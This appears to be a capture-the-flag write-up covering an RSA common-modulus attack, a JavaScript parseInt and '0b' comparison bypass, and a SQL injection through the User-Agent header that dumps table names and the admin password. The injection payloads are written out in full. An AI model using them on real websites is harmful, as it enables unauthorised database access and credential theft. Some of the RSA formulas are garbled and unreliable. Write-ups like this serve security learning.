RSA 1

from Crypto.Util.number import getPrime

rsa_q = getPrime(512)
rsa_p = getPrime(512)
n = rsa_q * rsa_p
exp1 = 0x10003
exp2 = 0x10001

According to RSA implemntation we get

$$ {m ^ {e_1}}\bmod {n} \equiv c_1 $$ $$ m ^{e_2} \bmod{n} \equiv c_2 $$

Extended Euclidean algorithm

$$ x_1e_1 + x_2e_2 = gcd(e_1, e_2) $$ In the given code , we can find that $e_1$ and $e_2$ is coprime , so apply egcd algorithm to solve for coefficient $x_1$ , $x_2 $.

def egcd(a, b): 

   if a == 0 : 
       return b,0,1
            
   gcd,x1,y1 = egcd(b%a, a) 
   x = y1 - (b//a) * x1 
   y = x1 
    
   return gcd,x,y

Solve for flag

Use $x_1$ and $x_2$ we get the equation

$$ m^{e_1c_1}m^{e_2c_2}\bmod{n} $$ $$ m^{e_1c_1+e_2*c_2}\bmod{n} $$ $$ m \bmod{n} $$

If any of the coefficient is negative , just find the multiplicative inverse , which can be easily evaluate by python built-in function pow().

parseInt() in depth

According to document.

The parseInt function converts its first argument to a string, parses that string, then returns an integer or NaN.

There is a part of text that worth notice.

If the input string, with leading whitespace and possible +/- signs removed, begins with 0x or 0X radix is assumed to be 16 and the rest of the string is parsed as a hexadecimal number.

parseInt("0x10") # 16

Note: Other prefixes like 0b, which are valid in number literals, are treated as normal digits by parseInt().

parseInt("0b10") # 0

Javascript comparison

When comparing a string with a number, JavaScript will convert the string to a number.

"123" > 122 # true
"0x123" > 123 # true
"0b11" > 11 # false

So we know that the conversion when comparing can handle 0b prefix , so input 0b + any number will pass the check.

Agent

We don’t have the source code for this challenge. After conducting some tests, we discovered that when we log in to the website, it writes the login record to a log file, including the IP address and the user agent. This allows us to control the user agent and attempt to inject something.

When I changed the user agent to abc’, it triggered the following error:

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '111.242.10.2')' at line 1

This led me to suspect a possible SQL injection vulnerability. I tried injecting some queries, but it kept showing the same syntax error.

After some thought, I hypothesized that the original source code might look like this:

INSERT INTO log_table VALUES ('..' , 'User agent' ,  'ip')

Based on this, I used a subquery to inspect the database structure:

INSERT INTO log_table VALUE ('..' , '' , ((SELECT table_name FROM INFORMATION_SCHEMA.TABLES  LIMIT  0,1) -- ')

Eventually, I found the admin account and retrieved the flag with the following query:

INSERT INTO log_table VALUE ('..' , '' , (SELECT password FROM users WHERE username = "admin" limit 0,1)-- ')
